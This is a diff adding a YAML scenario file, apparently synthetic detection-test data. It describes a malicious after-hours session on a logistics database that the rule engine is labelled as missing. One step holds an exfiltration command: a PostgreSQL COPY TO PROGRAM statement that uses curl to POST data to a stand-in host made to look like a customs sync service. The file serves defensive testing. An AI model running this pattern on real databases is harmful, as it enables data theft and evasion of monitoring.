@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_44_data_tamper_mal_1125
+family_id: gen_logistics_44_data_tamper_mal_fam1125
+domain: logistics
+time_of_day: 02:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: INSERT INTO shipments DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.13.20.139
+      port: 22
